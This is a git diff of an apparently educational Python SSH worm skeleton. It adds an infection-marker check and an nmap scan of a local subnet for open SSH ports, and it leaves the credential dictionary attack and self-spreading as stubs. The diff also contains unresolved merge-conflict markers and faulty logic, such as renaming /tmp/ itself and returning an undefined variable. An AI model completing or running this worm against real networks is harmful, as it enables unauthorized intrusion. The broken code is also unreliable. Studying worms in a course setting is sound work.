@@ -4,9 +4,13 @@ import socket
 import nmap
 import netinfo
 import os
+<<<<<<< HEAD
 import socket
 from hostscan import getHostsOnTheSameNetwork
 from getip import getifip
+=======
+import hostscan
+>>>>>>> 3b7da10208341c9f09e564928b18033baba804b5
 
 # The list of credentials to attempt
 credList = [
@@ -19,27 +23,27 @@ credList = [
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
+
 ##################################################################
 # Returns whether the worm should spread
 # @return - True if the infection succeeded and false otherwise
 ##################################################################
 def isInfectedSystem():
-    # Check if the system as infected. One
-    # approach is to check for a file called
-    # infected.txt in directory /tmp (which
-    # you created when you marked the system
-    # as infected).
-    pass
+    if os.path.exists('/tmp/infected.txt'):
+        return True
+    else:
+        return False
+
 
 #################################################################
 # Marks the system as infected
 #################################################################
 def markInfected():
+    if os.path.exists('/tmp/'):
+        os.rename('/tmp/', '/tmp/infected.txt')
+    else:
+        pass
 
-    # Mark the system as infected. One way to do
-    # this is to create a file called infected.txt
-    # in directory /tmp/
-    pass
 
 ###############################################################
 # Spread to the other system and execute
@@ -47,7 +51,6 @@ def markInfected():
 # to the victim system
 ###############################################################
 def spreadAndExecute(sshClient):
-
     # This function takes as a parameter
     # an instance of the SSH class which
     # was properly initialized and connected
@@ -72,7 +75,6 @@ def spreadAndExecute(sshClient):
 # 3 = probably the server is down or is not running SSH
 ###########################################################
 def tryCredentials(host, userName, password, sshClient):
-
     # Tries to connect to host host using
     # the username stored in variable userName
     # and password stored in variable password
@@ -95,6 +97,7 @@ def tryCredentials(host, userName, password, sshClient):
     # this skeleton).
     pass
 
+
 ###############################################################
 # Wages a dictionary attack against the host
 # @param host - the host to attack
@@ -103,7 +106,6 @@ def tryCredentials(host, userName, password, sshClient):
 # If the attack failed, returns a NULL
 ###############################################################
 def attackSystem(host):
-
     # The credential list
     global credList
 
@@ -118,7 +120,6 @@ def attackSystem(host):
 
     # Go through the credentials
     for (username, password) in credList:
-
         # TODO: here you will need to
         # call the tryCredentials function
         # to try to connect to the
@@ -135,6 +136,7 @@ def attackSystem(host):
     # Could not find working credentials
     return None
 
+
 ####################################################
 # Returns the IP of the current system
 # @param interface - the interface whose IP we would
@@ -142,23 +144,47 @@ def attackSystem(host):
 # @return - The IP address of the current system
 ####################################################
 def getMyIP(interface):
-
     # TODO: Change this to retrieve and
     # return the IP of the current system.
+<<<<<<< HEAD
     ip_addr = getifip()
     return ip_addr
+=======
+    return None
+
+>>>>>>> 3b7da10208341c9f09e564928b18033baba804b5
 
 #######################################################
 # Returns the list of systems on the same network
 # @return - a list of IP addresses on the same network
 #######################################################
 def getHostsOnTheSameNetwork():
+    # Create an instance of the port scanner class
+    portScanner = nmap.PortScanner()
+    # Scan the network for systems whose
+    # port 22 is open (that is, there is possibly
+    # SSH running there).
+    portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
+    # Scan the network for host
+    hostInfo = portScanner.all_hosts()
+    # The list of hosts that are up.
+    liveHosts = []
+    # Go trough all the hosts returned by nmap
+    # and remove all who are not up and running
+    for host in hostInfo:
+        # Is ths host up?
+        if portScanner[host].state() == "up":
+            liveHosts.append(host)
+    return liveHosts
 
+<<<<<<< HEAD
     # TODO: Add code for scanning
     # for hosts on the same network
     # and return the list of discovered
     # IP addresses.
     sameNetworks = getHostsOnTheSameNetwork
+=======
+>>>>>>> 3b7da10208341c9f09e564928b18033baba804b5
 
     return sameNetworks
 #######################################################
@@ -172,6 +198,7 @@ def cleaner(sshClient):
     # remove the worm program from the host
     pass
 
+
 # If we are being run without a command line parameters,
 # then we assume we are executing on a victim system and
 # will act maliciously. This way, when you initially run the
@@ -182,13 +209,12 @@ def cleaner(sshClient):
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP.
 if len(sys.argv) < 2:
-
     # TODO: If we are running on the victim, check if
     # the victim was already infected. If so, terminate.
     # Otherwise, proceed with malice.
-    passi
+    pass
 # TODO: Get the IP of the current system
-my_IP = getMyIP()
+
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
@@ -196,22 +222,19 @@ networkHosts = getHostsOnTheSameNetwork()
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
-networkHosts.remove(my_IP)
-print("Found hosts: ", networkHosts)
 
+print("Found hosts: ", networkHosts)
 
 # Go through the network hosts
 for host in networkHosts:
 
     # Try to attack this host
-    sshInfo =  attackSystem(host)
+    sshInfo = attackSystem(host)
 
     print(sshInfo)
 
-
     # Did the attack succeed?
     if sshInfo:
-
         print("Trying to spread")
 
         # TODO: Check if the system was
